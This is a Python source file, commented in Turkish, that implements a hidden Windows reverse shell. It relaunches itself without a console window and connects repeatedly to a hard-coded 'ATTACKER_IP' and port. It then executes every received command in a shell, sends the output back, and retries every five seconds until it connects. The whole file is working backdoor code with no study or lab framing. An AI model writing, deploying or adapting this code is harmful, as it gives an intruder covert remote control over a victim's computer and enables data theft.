import socket
import subprocess
import os
import time
import sys

ATTACKER_IP = '192.168.1.5'
PORT = 12346

# Windows Turkiye ortaminda dosya sistemi kodlamasi (cp1254) kullaniliyor.
FS_ENCODING = "cp1254"

def hide_console():
    # Eger zaten pythonw.exe ile calisiyorsa, hicbir sey yapma.
    if sys.executable.lower().endswith("pythonw.exe"):
        return
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw, sys.argv[0]], startupinfo=si)
        sys.exit()  # Mevcut terminali kapat.
    except Exception:
        pass

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, PORT))
            
            while True:
                # Gelen komutu FS_ENCODING ile decode ediyoruz.
                command = s.recv(1024).decode(FS_ENCODING, errors='replace')
                if not command or command.lower() == 'exit':
                    break

                # cd komutu: Calisma dizinini degistir.
                if command.lower().startswith('cd'):
                    try:
                        new_dir = command[3:].strip()
                        os.chdir(new_dir)
                        result = f"Calisma dizini degistirildi: {os.getcwd()}\n"
                    except Exception as e:
                        result = f"Dizin degistirilemedi: {str(e)}\n"
                    s.send(result.encode(FS_ENCODING, errors='replace'))
                    continue

                try:
                    proc = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    result = proc.stdout + proc.stderr
                    if not result:
                        result = b"Cikti yok.\n"
                    s.send(result)
                except Exception as e:
                    error_msg = f"Komut calistirilmadi: {str(e)}\n"
                    s.send(error_msg.encode(FS_ENCODING, errors='replace'))
                    
            s.close()
        except Exception:
            time.sleep(5)
            continue

if __name__ == "__main__":
    hide_console()  # Script arka planda calissin.
    connect()       # Reverse shell baglantisini baslat.
